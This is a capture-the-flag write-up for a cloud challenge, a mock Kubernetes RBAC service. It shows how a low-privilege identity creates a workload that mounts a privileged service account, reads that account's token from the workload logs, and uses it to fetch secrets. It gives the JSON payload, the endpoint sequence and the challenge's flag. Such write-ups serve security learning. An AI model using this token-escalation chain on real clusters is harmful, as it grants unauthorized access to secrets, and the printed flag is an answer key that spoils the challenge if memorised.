# Greenroom Atlas — CLOUD, 750 pts

Target: http://54.72.82.22:8410 (Werkzeug 3.1.9 / Python 3.11.16, Flask).

**FLAG: `safctf{6035ffad158ce604cb84927b77926d47}`**

## Surface

Index page + `GET /downloads/cluster.json` handed over the whole trust model:

```json
{
  "namespace": "backstage",
  "bindings":        { "tour-bot":      ["get:workloads", "patch:rolebindings"] },
  "roles":           { "editor":        ["create:workloads", "get:workloads/logs"] },
  "serviceAccounts": { "default":       ["read:public"],
                       "archive-agent": ["get:secrets"] }
}
```

Endpoints (from the desk-services note on the index and probing):

| Method | Path | Auth | Notes |
|---|---|---|---|
| POST | `/api/login` | none | returns `{"namespace":"backstage","token":"tour-bot"}` for any body |
| POST | `/api/workloads` | Bearer | body `{"spec":{...}}`, returns `{"name":"<16 hex>"}` |
| GET  | `/api/workloads/<name>/logs` | Bearer | returns `{"lines":[...]}` or `{"token":"<sa>"}` |
| PATCH| `/api/bindings` | Bearer | accepts `roleRef` (403 with tour-bot) |
| GET  | `/api/secrets` | Bearer | 403 without `get:secrets` |

## Exploit chain

This is a fake-Kubernetes RBAC puzzle (sibling of Stageworks :8400 but *not*
an AssumeRole/external-ID flow — no AWS anywhere).

1. `POST /api/login` → identity `tour-bot` (can create workloads + read logs).
2. `POST /api/workloads` with a spec that mounts a **different** service
   account and enables token automounting:

   ```json
   {"spec": {"serviceAccountName": "archive-agent",
             "automountServiceAccountToken": true}}
   ```

3. `GET /api/workloads/<name>/logs` — the workload's projected service-account
   token is echoed in the "logs": `{"token":"archive-agent"}`.
4. `GET /api/secrets` with `Authorization: Bearer archive-agent` → flag.

## The gate (extra stage over a naive read)

`automountServiceAccountToken: true` is required. Verified:

| spec | logs result |
|---|---|
| `archive-agent`, no automount key | `{"lines":["Ready."]}` |
| `archive-agent`, `automount...: false` | `{"lines":["Ready."]}` |
| `default`, `automount...: true` | `{"lines":["Ready."]}` (default only has `read:public`) |
| `archive-agent`, `automount...: true` | `{"token":"archive-agent"}` |

So the leak only fires for the privileged SA *and* only when the pod spec asks
for the token. `PATCH /api/bindings` (tour-bot's `patch:rolebindings`) returns
403 and was not needed — the flag is reached without it.

## Reproduce

```bash
python3 solve.py http://54.72.82.22:8410
```
